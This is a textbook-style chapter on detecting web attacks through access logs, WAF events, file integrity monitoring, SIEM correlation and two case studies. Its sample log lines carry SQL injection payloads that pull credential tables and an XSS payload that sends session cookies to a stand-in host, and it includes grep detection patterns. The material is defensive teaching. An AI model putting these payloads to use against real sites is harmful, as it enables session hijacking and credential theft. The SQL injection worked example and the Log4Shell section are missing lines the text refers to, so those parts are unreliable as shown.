I. Assuming Prevention Will Fail

Perimeter defenses, firewallsFirewallSoftware or hardware that filters traffic entering or leaving a network based on rules about source, destination, and port. Operates at OSI Layers 3–7; see NIST SP 800-41 for firewall policy guidance., network segmentation, and access control lists, are designed to keep adversaries out. But every mature security program operates on the assumption that prevention will eventually fail: a zero-day will be weaponized, a credential will be phished, a misconfigured API will be exposed. Application threat auditingApplication Threat AuditingThe discipline of continuously reviewing application-layer evidence, logs, file states, and behavioral baselines, to detect exploitation that has already occurred or is in progress. It answers the question prevention cannot: "did something get through, and what did it do?" Falls under NIST SP 800-92 (Guide to Computer Security Log Management) and underpins the detection pillar of the NIST Cybersecurity Framework (Detect function, DE.CM). is the academic and operational discipline built around that assumption. Rather than asking "how do we stop the attacker," it asks "how do we prove, from the evidence an application leaves behind, that an attacker was here, and what did they touch?"

This discipline sits at the intersection of three evidentiary sources. First, application and web server logsApplication/Web Server LogA structured or semi-structured record of every request an application processed, who asked, what they asked for, when, and what happened. Apache and Nginx write these in near-real time to disk. Common Log Format (CLF) and Combined Log Format are the de facto standards; see the Apache HTTP Server documentation and RFC 3164 for related syslog transport. record the literal strings attackers send, a SQL injection payload or a cross-site scripting vector leaves a textual fingerprint in the request line before the server even finishes processing it. Second, file integrity monitoring (FIM)File Integrity Monitoring (FIM)A control that maintains a trusted baseline of file states (typically cryptographic hashes) and alerts when a monitored file changes unexpectedly. Answers "did anyone modify something they shouldn't have?" rather than "what did they send?" Formalized in tools like Tripwire (1992, Kim & Spafford, Purdue University) and AIDE; required under PCI DSS Requirement 11.5 for cardholder data environments. proves whether the attacker succeeded in altering something on disk, a web shell dropped into an upload directory, a modified binary, a tampered configuration file. Third, anomaly detectionAnomaly DetectionIdentifying activity that deviates statistically from an established behavioral baseline, as opposed to matching a known-bad signature. Flags the unknown-unknowns: a service account suddenly querying the database at 3 a.m., or a user downloading ten times their normal data volume. Formalized via statistical process control (e.g., z-scores, moving averages) and unsupervised machine learning models; see NIST SP 800-94 for IDS/IPS anomaly-based detection theory. catches what no signature was written for, the slow, novel, or insider-driven deviation from normal behavior that neither a log pattern nor a file hash would flag on its own.

Prevention Blocks What It Recognises; Auditing Assumes It Did Not Students often conflate a Web Application Firewall (WAF) blocking a request with "detection." They are related but distinct disciplines. Prevention stops a known-bad pattern before it executes. Auditing assumes prevention already failed somewhere, maybe the WAF rule didn't cover this payload variant, maybe the attacker used a zero-day, maybe it was an authorized insider abusing legitimate access that no firewall rule would ever block. Auditing is the forensic and monitoring layer that exists precisely because you cannot prevent everything. The mental model to discard is "we have a firewall, so we do not need logging." The firewall answers what it recognised and rejected; the log is the only record of what it did not.

The theoretical backbone of log-based detection is signature-based detectionSignature-Based DetectionMatching observed data against a library of known-malicious patterns, strings, regular expressions, or byte sequences associated with documented attacks. Fast and low false-positive, but blind to anything novel. The core mechanism behind classic IDS engines like Snort and Suricata, and behind WAF rule sets such as the OWASP ModSecurity Core Rule Set (CRS). contrasted against behavioral baseliningBehavioral BaseliningEstablishing a statistical model of "normal" for a system, user, or application, typical request volume, typical source geographies, typical file-access patterns, so that deviations become measurable rather than subjective. Underpins User and Entity Behavior Analytics (UEBA) platforms and the anomaly-detection modules of modern SIEMs; grounded in statistical process control theory (Shewhart, 1931).. A SQL injection attempt containing ' OR '1'='1 can be caught by a signature the moment it appears in a log line. A compromised service account slowly exfiltrating one megabyte of customer data per night, staying under any single alert threshold, will never trip a signature, it can only be caught by comparing this week's behavior to months of established baseline. A mature Security Operations Center (SOC)Security Operations Center (SOC)The organizational team and facility responsible for continuous monitoring, detection, and response to security events, typically staffed in tiers (Tier 1 triage analysts, Tier 2 investigators, Tier 3 threat hunters). NIST SP 800-61 Rev. 2 (Computer Security Incident Handling Guide) defines the operational lifecycle a SOC executes: preparation, detection/analysis, containment/eradication/recovery, post-incident activity. runs both approaches in parallel, because each covers the other's blind spot.

Centralizing these evidentiary streams is not optional at scale. A single application server might generate tens of thousands of log lines per hour; a large enterprise with hundreds of services generates volumes no human can review manually. This is the motivating problem behind log aggregationLog AggregationThe practice of collecting logs from many distributed sources (web servers, firewalls, endpoints, databases) into a single centralized store where they can be normalized, correlated, and searched together. Commonly implemented with the ELK/Elastic Stack, Splunk, or Graylog; log shipping is frequently handled via Filebeat, Fluentd, or syslog-ng over RFC 5424 syslog transport. and the rise of the Security Information and Event Management (SIEM)SIEM, Security Information and Event ManagementA platform that ingests logs from across an organization, normalizes them into a common schema, and applies correlation rules to surface events that are only meaningful in combination, e.g., a failed login on the VPN followed by a successful login from a new country followed by a large database export. Gartner coined "SIEM" in 2005 merging Security Information Management (SIM) and Security Event Management (SEM); modern examples include Splunk Enterprise Security, Microsoft Sentinel, and Elastic Security. platform as the field's central tool. A SIEM's value is not merely storage, it is correlationCorrelation RuleA rule that fires an alert only when multiple discrete events, each individually benign or low-severity, occur together in a pattern indicative of an attack. Correlation is what separates a SIEM from a simple log archive; MITRE ATT&CK technique mappings are frequently used as the taxonomy correlation rules are built against.: joining a suspicious log line on one server with a file hash mismatch on another and a behavioral outlier on a third, at the same timestamp, to reconstruct the narrative of an attack that no single data source could tell alone.

From Collecting Logs to Reading Them If you covered centralized logging and SIEM architecture in Unit 4, this topic is the applied specialization of that infrastructure toward the application and data layer specifically. Where Unit 4 asked "how do we collect and store logs at scale," Topic 5.6 asks "what do we actually look for once the logs exist", the analyst-facing half of the same pipeline.

II. Finding Attacks in Access Logs, WAF Events, and File Integrity Checks

Recognizing Injection Attempts in Web Server Access Logs

Every request to an Apache or Nginx web server is written to an access logAccess LogThe log file recording every HTTP request served, typically in Common Log Format (client IP, timestamp, request line, status code, response size) or the extended Combined Log Format (adds referrer and user-agent). Default paths: /var/log/apache2/access.log (Debian/Ubuntu Apache), /var/log/nginx/access.log. Format directives configured via Apache's LogFormat or Nginx's log_format. before the application logic even executes. Because the raw request string is preserved verbatim, injection payloads, which must be syntactically valid within the request, appear as recognizable, often ungrammatical fragments inside the URL or query string. A SQL injectionSQL Injection (SQLi)An attack that inserts or alters SQL query logic by supplying crafted input to a field the application concatenates directly into a database query, allowing an attacker to read, modify, or delete data outside their authorization. MITRE ATT&CK T1190 (Exploit Public-Facing Application); ranked #3 on the OWASP Top 10 (2021) as part of "Injection." attempt against a login or search parameter frequently contains SQL keywords, quote characters, and comment delimiters that have no legitimate reason to appear in a normal request:

Apache Combined Log Format 
203.0.113.44 - - [09/Jul/2026:03:14:22 -0400] "GET /products.php?id=1%20UNION%20SELECT%20username,password,3%20FROM%20users--%20 HTTP/1.1" 200 4821 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"

Several signals in this single line justify immediate escalation. The User-AgentUser-Agent StringAn HTTP header a client sends identifying the software making the request, such as a browser name and version. Trivially spoofable, but attackers using automated tools frequently forget to change it from the tool's default, leaving a free indicator. Defined in RFC 9110 §10.1.5; SIEM rules commonly blocklist known scanner/exploit-tool signatures such as sqlmap, nikto, and dirbuster. string identifies sqlmap, an automated SQL injection exploitation tool, a legitimate browser would never send this. The URL-decodedURL Encoding / Percent-EncodingA scheme for representing reserved or non-ASCII characters in a URL using a percent sign followed by two hex digits (e.g., a space becomes %20). Attackers rely on encoding to smuggle characters like quotes and spaces past naive filters that only inspect the raw, unencoded string. Defined in RFC 3986 §2.1; log analysis tooling must decode the request line before pattern matching or payloads hide in plain sight. query string reveals a classic UNION-based injectionUNION-Based SQL InjectionA SQLi technique that appends a UNION SELECT clause to the original query so the attacker's chosen columns are returned alongside (or instead of) the legitimate result set, commonly used to exfiltrate data such as credential tables. Requires the attacker to first determine the number of columns in the original query, typically via ORDER BY probing, before crafting a matching UNION SELECT., appending UNION SELECT username,password,3 FROM users-- to pull credentials out of a table the application was never meant to expose through this endpoint. The trailing double-dash is a SQL comment terminatorSQL Comment InjectionAppending a comment marker (-- in most SQL dialects, # in MySQL) after injected logic to nullify the remainder of the original query, preventing a syntax error from the legitimate query fragments that follow. A near-universal signature in SQLi payloads; log-hunting regexes frequently key on this pattern specifically because it has almost no legitimate use in normal query strings. used to silently discard the rest of the application's original query so the injected clause parses without a syntax error. Notably, the server responded with 200, meaning the request was processed rather than rejected, which is precisely why log-based detection matters even in environments with a WAF: a novel payload variant can slip past filtering rules and only the log record proves it happened.

Reading an Attack Out of a Raw Request Line Reading a raw log line is a matter of asking which interpreter the payload was aimed at, and the answer is legible in the syntax. A SQL injection attempt is aimed at a query parser, so it carries SQL keywords (UNION, SELECT, OR 1=1), quote characters (' or %27 encoded), and comment markers (--, #). Cross-site scripting (XSS)Cross-Site Scripting (XSS)An injection attack where malicious script is inserted into content served to other users, executing in their browser session with the site's trust. Reflected XSS echoes attacker input immediately in the response; stored XSS persists the payload in application data for later victims. MITRE ATT&CK T1189 (Drive-by Compromise) is often chained from XSS; part of OWASP Top 10 "Injection" category (2021 edition merged XSS into the broader Injection category). log lines instead contain HTML/JavaScript tags and event handlers in the query string, <script>, onerror=, javascript:, or their URL-encoded equivalents (%3Cscript%3E). Both routinely arrive percent-encoded, so any analysis, by eye or by rule, has to decode first: %27 is a single quote, %3C and %3E are angle brackets, and a signature written against the raw line will miss every encoded variant. The status code then tells you what happened next: a 403 is a control working, a 200 is a request the application processed.

A reflected XSS probe looks structurally different but follows the same principle of leaving a literal, syntactically telling fragment in the request line:

Nginx Access Log, XSS Probe 
198.51.100.9 - - [09/Jul/2026:03:16:05 -0400] "GET /search?q=%3Cscript%3Edocument.location%3D%27https%3A%2F%2Fevil-collector.net%2Fc%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1" 200 3110 "-" "Mozilla/5.0 (compatible; XSStrike/3.1)"

Decoded, the q parameter contains <script>document.location='https://evil-collector.net/c?c='+document.cookie</script>, a classic session cookie theftSession Cookie Theft via XSSUsing injected script to read document.cookie and exfiltrate the value to an attacker-controlled server, allowing the attacker to impersonate the victim's authenticated session without ever learning their password. Primary mitigation is the HttpOnly cookie attribute (prevents JavaScript access to the cookie value entirely), defined alongside Secure and SameSite attributes in RFC 6265bis. payload that redirects the victim's browser to an attacker server, appending their session cookie as a query parameter. The tool signature XSStrike in the User-Agent is another automated-scanner giveaway.

Hunting Log Files with grep and awk

Analysts rarely wait for a SIEM correlation rule to fire; ad hoc command-line hunting across raw logs remains a working analyst's first move, particularly in the hours after a disclosure when no rule exists yet. A basic sweep for common injection indicators across a rotated log directory:

bash 
# Sweep access logs for common SQLi / XSS indicators (case-insensitive)
grep -EiI "union([[:space:]]|%20)+select|or%201%3D1|or 1=1|--%20|<script|onerror=|javascript:" \
  /var/log/nginx/access.log*

# Tally offending source IPs to find the noisiest scanner
grep -Ei "union.+select|<script" /var/log/nginx/access.log \
  | awk '{print $1}' | sort | uniq -c | sort -rn | head -10

# Flag any request that returned 200 despite containing an obvious SQL comment terminator
# (a WAF-bypass indicator: the payload succeeded rather than being blocked)
awk -F'"' '$2 ~ /--%20|--\+|#/ {print}' /var/log/nginx/access.log | grep '" 200 '

The final awk command illustrates a specifically valuable hunting pattern: filtering for requests that both contain an injection indicator and resulted in a successful HTTP status code, rather than a 403 block from the WAF. A blocked attempt is a policy success story; a successful request containing an injection signature is the one that demands immediate incident response.

The Web Application Firewall as a Detection Source

A web application firewallWAF, Web Application FirewallA reverse proxy that inspects HTTP requests and responses against a rule set before they reach the application, blocking or logging those that match. The OWASP ModSecurity Core Rule Set is the dominant open rule base; commercial and cloud WAFs layer managed rules and rate limiting on top of the same model. sits in front of the application and evaluates each request against a rule set, commonly the OWASP Core Rule Set, before the application sees it. Its preventive value is real but bounded: it recognises payloads that resemble what its rules describe, which means it stops opportunistic scanning reliably and a determined attacker who is willing to re-encode, fragment, or rephrase a payload considerably less so. Its detection value is arguably greater than its prevention value and is frequently overlooked. A WAF log records the rule that matched, the score the request accumulated, and the action taken, so it converts a raw request line into an interpreted event, and it does so for requests the application never processed.

Two operating decisions determine what a deployment is worth. The first is detection mode versus blocking mode: a new rule set run in detection mode produces alerts without breaking legitimate traffic, which is the only safe way to measure its false-positive rate before it is allowed to reject anything. The second is what to do with requests the WAF passed. A blocked request is a control working, and a large volume of blocked requests is mostly background noise from the internet. The interesting record is the one that matches a rule and receives a 200 from the application, a rule scored the request as suspicious and the application answered it anyway, which is the signature of a bypass or a mis-scoped rule. Correlating WAF verdicts against application response codes and sizes is the highest-value routine query an operations team can run against this data.

File Integrity Monitoring: Baseline and Verification

Where log analysis catches the attempt, FIM catches the consequence. The mechanism is conceptually simple: compute a cryptographic hashCryptographic Hash FunctionA one-way function producing a fixed-length fingerprint from arbitrary input, such that any change to the input, even a single bit, produces a completely different output, and the original input cannot practically be recovered from the hash. SHA-256 (FIPS PUB 180-4) is the current standard for FIM baselines; MD5 and SHA-1 are deprecated for integrity use due to demonstrated collision attacks. of every file that matters, binaries, configuration files, web application source, while the system is in a known-good state, store those hashes as a trusted baseline, and periodically recompute the hashes to detect drift. Any mismatch means the file changed, and if no authorized change ticket explains it, that mismatch is evidence of compromise.

bash 
# Establish a SHA-256 baseline for the web root
sha256sum -- /var/www/html/*.php /var/www/html/uploads/* > /opt/fim/baseline_webroot.sha256

# Later (e.g., via cron every 15 minutes): verify against baseline
sha256sum -c /opt/fim/baseline_webroot.sha256 --quiet

# Example output on a compromised host:
# /var/www/html/uploads/profile_pic_884.php: FAILED
# sha256sum: WARNING: 1 computed checksum did NOT match

A hand-rolled sha256sum baseline is instructive but does not scale to enterprise use, which is why purpose-built FIM tools exist. TripwireTripwireOne of the earliest FIM tools, originally developed by Gene Kim and Eugene Spafford at Purdue University in 1992. Maintains a signed database of file metadata and hashes, alerting on any deviation and requiring cryptographic re-approval to "accept" legitimate changes into the new baseline. Kim, G. & Spafford, E. (1994). The Design and Implementation of Tripwire: A File System Integrity Checker. Purdue University Technical Report CSD-TR-93-071., still in commercial and open-source use, pioneered the model of a policy file defining watched paths and a cryptographically signed database preventing an attacker who gains root from simply editing the baseline to hide their tracks. AIDE (Advanced Intrusion Detection Environment)AIDE, Advanced Intrusion Detection EnvironmentAn open-source, free reimplementation of Tripwire's core concept: a configuration file defines monitored directories and which attributes to hash (permissions, ownership, size, and one or more hash algorithms), and aide --check reports deviations from the stored database. Widely deployed on Linux systems; configuration lives in /etc/aide/aide.conf, database typically at /var/lib/aide/aide.db. is the dominant free alternative on Linux systems:

bash 
# /etc/aide/aide.conf excerpt, monitor the web application directory
/var/www/html   NORMAL

# Initialize the baseline database (run once, on a known-clean system)
sudo aideinit
sudo mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db

# Run a check (typically scheduled via cron)
sudo aide --check

# Sample AIDE check output flagging a web shell drop
# File: /var/www/html/uploads/x.php
#   Added
#   SHA256 : yJ3F2q9K...
#   Perm   :                        |  -rw-r--r--

Modern SOCs increasingly fold FIM into a broader endpoint telemetryEndpoint TelemetryContinuous, queryable data collected from a host about its own state, running processes, open network sockets, loaded kernel modules, file changes, exposed for on-demand investigation rather than only periodic scheduled checks. osquery, originally developed by Facebook and open-sourced in 2014, exposes this data through a SQL query interface over a virtual "operating system as a database" abstraction. platform such as osqueryosqueryAn open-source endpoint agent that represents operating system state as SQL-queryable virtual tables, letting analysts write a SQL query such as SELECT * FROM file WHERE path LIKE '/var/www/html/%' AND mtime > (strftime('%s','now')-3600) to hunt for recently modified files across a fleet in real time, rather than waiting for a scheduled scan. Originally released by Facebook in 2014; now a Linux Foundation project used heavily for fleet-wide FIM and behavioral hunting., which allows analysts to hunt for recent file modifications interactively rather than waiting on a scheduled AIDE run.

Verifying a File Against a Published Hash

File integrity monitoring compares a file against a baseline the organization itself recorded. The related but distinct question, is the file I just downloaded the file the publisher released? — is answered by comparing a computed digest against one the publisher states. Both reduce to the same operation, and both are worth being able to perform from memory on either platform.

bash / PowerShell, computing and comparing a digest 
# Linux / macOS: compute a SHA-256 digest of a downloaded file
sha256sum installer-4.2.1.tar.gz
# 9f2c7d1e0a4b8836ff41c9b5e7d2a0c6b3548e91d7fa2c0b5e6314a8d9027bcf  installer-4.2.1.tar.gz

# Compare against the publisher's checksum file, non-interactively
curl -sO https://downloads.example.org/installer-4.2.1.tar.gz.sha256
sha256sum -c installer-4.2.1.tar.gz.sha256
# installer-4.2.1.tar.gz: OK          <- digests match
# installer-4.2.1.tar.gz: FAILED      <- do not execute this file

# Windows PowerShell: same operation
Get-FileHash -Algorithm SHA256 .\installer-4.2.1.tar.gz | Format-List
# Algorithm : SHA256
# Hash      : 9F2C7D1E0A4B8836FF41C9B5E7D2A0C6B3548E91D7FA2C0B5E6314A8D9027BCF

# Compare in script, case-insensitively, without eyeballing 64 hex characters
$expected = '9f2c7d1e0a4b8836ff41c9b5e7d2a0c6b3548e91d7fa2c0b5e6314a8d9027bcf'
$actual   = (Get-FileHash -Algorithm SHA256 .\installer-4.2.1.tar.gz).Hash
if ($actual -ieq $expected) { 'MATCH' } else { 'MISMATCH - do not run' }

Reading the result correctly requires knowing what a match does and does not establish. A match shows that the bytes on disk are the bytes whose digest was published; since SHA-256 has no known practical collision, an attacker cannot construct a different file with the same digest. A mismatch is unambiguous evidence that the file is not the published one, though the cause may be mundane, a truncated download, a proxy that rewrote the file, a version mismatch between the file and the checksum. Either way the file must not be executed until the discrepancy is explained.

What a match does not establish is authenticity, and this is the failure that matters most in practice. A checksum published on the same web page as the download, served by the same server, protects only against accidental corruption. An attacker who can replace the installer can replace the digest beside it in the same operation, and the comparison will then succeed against a file the attacker built. The published hash is only meaningful when it travels by a path the attacker would have to compromise separately, a signature over the checksum file made with a key the user already trusts, a digest recorded in a transparency log or an independent package index, a fingerprint obtained out of band. This is why serious distributions publish a detached signature over the checksum file rather than the checksum alone: verifying that signature moves the trust question from "was this page compromised" to "was this key compromised," and the key is not sitting on the download server. The same reasoning applies inside the organization: a file integrity baseline stored on the host it monitors is a baseline an attacker with root can rewrite, which is why Tripwire signs its database and why baselines belong in a trust domain the monitored host cannot write to.

Algorithm choice is part of the same judgement. MD5 and SHA-1 remain adequate for detecting accidental corruption and are useless against a deliberate adversary: practical chosen-prefix collisions exist for both, meaning an attacker can prepare two files with the same digest, publish the benign one, and later substitute the other. FIPS 180-4 specifies the SHA-2 family, and SHA-256 is the correct default for integrity verification and for FIM baselines alike.

Detecting Attacks Against the Data Itself

Most of this chapter watches requests and files. A separate class of control watches the data, and it answers questions the request logs cannot. Database activity monitoringDatabase Activity Monitoring (DAM)Inspection of the statements actually reaching the database engine, independent of the application that issued them, with alerting on privileged operations, schema changes, and abnormal result-set volumes. Sees activity that bypasses the application entirely, such as a direct connection using stolen service-account credentials. records the statements the engine really executed, which is the only evidence available when an attacker connects directly with a stolen service-account credential and never touches the web tier. Its most valuable signal is volumetric rather than syntactic: an account whose queries normally return single rows suddenly returning several million is an exfiltration indicator regardless of whether any statement looks malicious.

Data loss preventionDLP, Data Loss PreventionControls that inspect data in motion, at rest, and in use against policies describing sensitive content, by pattern, by classification label, or by exact-match fingerprinting of known records, and block, quarantine, or alert on policy violations. Deployed at network egress, on endpoints, and inside cloud storage and mail services. approaches the same problem from the content side, matching outbound traffic and stored objects against descriptions of what sensitive data looks like: a regular expression with a checksum test for payment card numbers, a classification label applied at creation, or an exact-data fingerprint derived from the customer database so that a match is a match on real records rather than on the shape of a number. DLP is the control that notices thirty thousand records leaving through a channel nobody thought to monitor, and it is also the control most prone to false positives, since a test file of synthetic card numbers looks exactly like the real thing.

Three further signals belong in any programme that claims to detect attacks on data. Access-pattern analytics compare each account against its own history and against its peer group, which is how a clinician reading forty thousand records in an afternoon becomes visible when no individual read was unauthorized. Canary records, fabricated rows, files, or credentials that no legitimate process should ever touch, convert a subtle detection problem into a binary one, because any access at all is by construction unauthorized. Backup and restore verification catches the integrity attack that all of the above miss: data quietly altered rather than copied, which is invisible to volume-based detection and shows up only when a restored copy is compared against the running one.

Judging Whether a Detection Method Is Worth Having

Objective 5.6.C asks for an evaluation, and an evaluation needs criteria. Five are enough to separate a control worth deploying from one that will be switched off within a quarter.

  • What it can see, and what it structurally cannot. A signature engine sees known strings and is blind to the novel variant. FIM sees the consequence on disk and is blind to an attack that reads without writing, which is to say, blind to most data theft. Behavioural analytics see deviation and are blind to an attacker whose behaviour was included in the baseline period.
  • How much noise it produces per true finding. This is the criterion most often skipped and the one that decides whether the control survives contact with an operations team. A rule generating four hundred alerts a day of which two matter will be tuned into silence or ignored, and the Target case is what that looks like from the outside.
  • How long it takes to fire. A control that detects in seconds supports containment; one that detects on a nightly schedule supports investigation. Both are legitimate, but they are not substitutes, and a programme with only the second cannot honestly claim a short mean time to detect.
  • What it costs to run, in analyst time as well as licence. Storage and licensing are visible; the tuning burden, the baseline re-certification after every deployment, and the triage load are the costs that actually consume the budget.
  • Whether an attacker can see or disable it. A control whose alerts an attacker with local administrator rights can delete has a defined failure mode. Shipping logs off-host immediately, to a store the monitored host cannot rewrite, is the difference between evidence and a suggestion.

A worked comparison makes the trade-offs concrete. Against a web shell dropped through a file-upload endpoint, FIM detects reliably and quickly, produces almost no noise if its baseline is re-certified at each deployment, and costs little, an excellent fit. Against an authenticated insider exporting customer records through a legitimate reporting screen, FIM detects nothing whatever, because no file changed; access-pattern analytics and DLP are the only controls in the chapter with any chance, and both come with a false-positive burden that has to be staffed. Against a novel exploitation attempt in the first hours after a disclosure, no signature exists yet, and the control that answers the question is retained centralized logging searched retrospectively, which detects nothing in real time and is nevertheless the reason an organization can say, on the day of a Log4Shell, whether it was hit.

Reporting a Finding, and Preserving It

An indicator that stays in an analyst's terminal has not been reported. A finding written for someone else to act on states, in order: what was observed, quoted exactly; when, in a stated time zone or in UTC; where, by host and by log source; what the analyst assesses it to mean, with a confidence; what has already been done; and what decision is being requested. Two log lines from the same afternoon show the difference between an indicator and a finding.

198.51.100.23 - - [14/Mar/2026:14:03:52 +0000] "GET /report.php?id=41%20ORDER%20BY%208-- HTTP/1.1" 200 8814 "-" "Mozilla/5.0"
198.51.100.23 - - [14/Mar/2026:14:03:57 +0000] "GET /report.php?id=41%20ORDER%20BY%209-- HTTP/1.1" 500  418 "-" "Mozilla/5.0"
198.51.100.23 - - [14/Mar/2026:14:07:30 +0000] "GET /report.php?id=41%20UNION%20SELECT%20NULL,email,pw_hash,NULL,NULL,NULL,NULL,NULL%20FROM%20members-- HTTP/1.1" 200 214773 "-" "Mozilla/5.0"

Read in sequence these five lines tell a complete story, and no one of them tells it alone. The first pair is a boolean test: the same endpoint returns 8814 bytes for a condition that is true and 1120 for one that is false, which establishes that the parameter reaches the query and that the response is a usable oracle. The second pair counts columns; ORDER BY 8 succeeds and ORDER BY 9 throws a 500, fixing the result set at eight columns. The last line uses that count to build a matching UNION SELECT against a credentials table, and the response size, 214773 bytes where the endpoint normally returns 8814, is the part that turns an attempted attack into a probable breach. Note also that the User-Agent is an ordinary browser string throughout, which is the usual case; tool signatures are a gift, not a requirement.

The finding written from this reads roughly: between 14:02 and 14:08 UTC on 14 March 2026, source 198.51.100.23 conducted and appears to have completed a UNION-based SQL injection against the id parameter of /report.php on web01, extracting from the members table; assessed with high confidence from the boolean-differential responses, the column-count enumeration, and a final 214 KB response against an 8.8 KB baseline; the source address has been blocked at the edge and the host's logs preserved; requesting authorisation to take web01 out of rotation and to begin notification assessment for the member table. That is a paragraph a manager can act on.

Preservation is the step most often skipped under pressure. Once an incident is plausible, the evidence must be handled so that it will still be admissible and still be credible months later. Chain of custodyChain of CustodyThe documented, unbroken record of who collected each item of evidence, when, from where, and everyone who has held it since, together with cryptographic hashes proving the item has not changed while in custody. A gap in the record does not merely weaken an item's evidential weight; it can render it inadmissible. means, concretely: work from a copy and never from the original; compute a SHA-256 digest of the acquired image or log file at the moment of acquisition and record it in the case notes; store the original read-only, in a location the compromised host cannot reach; log every person who accesses the copy, with times; and re-verify the digest whenever the evidence changes hands. Guidance is set out in NIST SP 800-86. Volatile evidence is collected first, because it is the evidence that disappears, memory, running processes, and network connections before disk, and disk before anyone reboots the machine. Two ordinary reflexes destroy cases: rebooting a suspect host to "clear" it, and logging in with administrative tools that overwrite timestamps and free space on the very volume under examination.

Anomaly Detection and SIEM Correlation

The final layer builds a statistical model of "normal" and alerts on deviation. A SIEM correlation rule might combine a threshold-based baseline, average requests per minute from a given IP over the trailing thirty days, plus or minus a standard deviation, with contextual enrichment such as GeoIPGeoIP LookupResolving an IP address to an approximate geographic location using a commercial or open database, used in SIEM enrichment to flag logins or requests originating from unexpected or high-risk countries. MaxMind GeoLite2 is a widely used free database; accuracy is city-level at best and easily defeated by VPNs, but remains a useful low-cost enrichment signal. lookups and known threat-intelligence IP reputation feeds. A representative correlation rule, expressed in pseudo-logic resembling common SIEM query languages:

SIEM Correlation Pseudo-Rule 
rule: fim_and_webshell_correlation
window: 10m
condition:
  (source=nginx_access AND uri MATCHES "\.php(\?|$)" AND status=200
     AND source_ip NOT IN known_admin_ips)
  FOLLOWED_BY
  (source=aide_fim AND event=file_added AND path STARTSWITH "/var/www/html/uploads/")
severity: CRITICAL
action: isolate_host, page_oncall

This rule fires only when an unusual upload-directory request is immediately followed by FIM detecting a new file in that same directory, a pattern log analysis or FIM alone would each report as low-confidence noise, but which together constitute near-certain evidence of a web shell upload.

III. Case Studies: Target and Log4Shell

Case Study 5.6.1: Target Corporation (2013), Alerts Fired, No One Acted

In November–December 2013, attackers who had gained a foothold via a compromised HVAC vendor's credentials moved laterally into Target's point-of-sale network and installed memory-scraping malwareMemory-Scraping Malware (RAM Scraper)Malware designed to read plaintext payment card data directly from a point-of-sale terminal's volatile memory during the brief window between card swipe and encryption, bypassing encryption-at-rest and in-transit controls entirely. The 2013 Target intrusion used a variant of the BlackPOS/Kaptoxa malware family to harvest track data before it was encrypted for transmission. on thousands of registers, ultimately exfiltrating roughly 40 million payment card records. Target had deployed FireEyeFireEye Endpoint/Network SecurityA commercial threat-detection platform Target had deployed roughly six months before the breach, capable of detecting malware behavior via sandboxed execution analysis and alerting a monitoring team, in this case, a security operations team based in Bangalore that escalated findings to Target's Minneapolis headquarters. Documented in the U.S. Senate Committee on Commerce, Science, and Transportation's 2014 majority staff report, "A 'Kill Chain' Analysis of the 2013 Target Data Breach." exactly for this scenario, and it worked as designed, the tool detected the malware's exfiltration behavior and generated alerts, some rated with the highest available severity, on multiple occasions before the bulk of the card data was stolen. The alerts were reviewed by a monitoring team and escalated to Target's security staff. No action was taken until after card issuers and the U.S. Department of Justice separately notified Target that a breach was underway.

This case is the canonical counterexample to the assumption that detection tooling alone constitutes a defense program. The technical layer performed its function; the organizational process for triaging, prioritizing, and acting on alerts failed. It illustrates why application threat auditing must be understood as a full lifecycle, detection, triage, escalation, and responseDetection-to-Response LifecycleThe full operational chain an alert must traverse to produce a defensive outcome: automated detection, human or automated triage of severity and false-positive likelihood, escalation to a decision-maker with authority to act, and a timely response action. A break at any link renders the earlier links worthless. Formalized in NIST SP 800-61 Rev. 2's incident handling lifecycle: Preparation, Detection & Analysis, Containment/Eradication/Recovery, Post-Incident Activity., not merely a technology deployment.

An Alert Nobody Reads Is an Expensive Log Evaluating a detection method means evaluating the whole path from sensor to action, not the sensor alone. Separate the technical control from the operational process wrapped around it and ask where the chain breaks. A SIEM, a FIM tool, or an IDS generating an alert satisfies only the detection stage. If no analyst reviews it, if the alert is buried under thousands of low-fidelity false positives, or if the escalation path lacks authority to act, the organization has not achieved detection in any meaningful sense, it has purchased an expensive log.

Case Study 5.6.2: Log4Shell (December 2021), Detection Through JNDI String Hunting

On December 9, 2021, a critical remote code execution vulnerability was disclosed in Log4jApache Log4jAn extremely widely used Java logging library, embedded (often transitively, several dependency layers deep) in an enormous share of enterprise Java applications. The vulnerable feature, JNDI message-lookup substitution, had existed since Log4j 2.0-beta9 (2013), making the exploitable install base massive and difficult to fully inventory., a near-ubiquitous Java logging library. Tracked as CVE-2021-44228CVE-2021-44228 (Log4Shell)The Common Vulnerabilities and Exposures identifier for the Log4j JNDI lookup remote code execution flaw, assigned the maximum CVSS score of 10.0. The bug allowed an attacker to achieve arbitrary code execution merely by getting a crafted string logged by a vulnerable application. Publicly disclosed December 9, 2021; patched in Log4j 2.15.0, with subsequent related CVEs (2021-45046, 2021-45105) requiring further patches to 2.17.1. and nicknamed "Log4Shell," the flaw exploited Log4j's JNDI (Java Naming and Directory Interface)JNDI, Java Naming and Directory InterfaceA Java API allowing applications to look up objects and resources by name, including remotely via protocols such as LDAP and RMI. What made Log4Shell distinct from most zero-days is that log analysis became simultaneously the exploitation surface and the primary detection mechanism. The very act of an application writing an HTTP header to a log file was what triggered exploitation, and that same act left the exact JNDI lookup string sitting in the access log for any defender who thought to search for it:

Within hours of disclosure, security teams worldwide were running near-identical hunts across historical log archives:

# common obfuscation variants used to evade naive WAF regexes

Organizations that retained months of centralized, searchable log history were able to retroactively determine, within hours, whether they had been probed or actually compromised before the public disclosure, a capability entirely dependent on the log aggregation and retention practices established long before the incident. Organizations without centralized logging, or with retention windows shorter than the vulnerability's multi-year dormancy, could not answer that question at all. Log4Shell is frequently cited as the strongest real-world argument for the log aggregation and retention practices this chapter covers, precisely because it demonstrates that the value of a log is only realized in hindsight, at a moment you cannot predict in advance.

IV. Log Aggregation, Layered Detection, and Tuning

An effective application threat auditing program is built from layered, mutually reinforcing controls rather than any single tool:

1. Centralized Log Aggregation with Guaranteed Retention

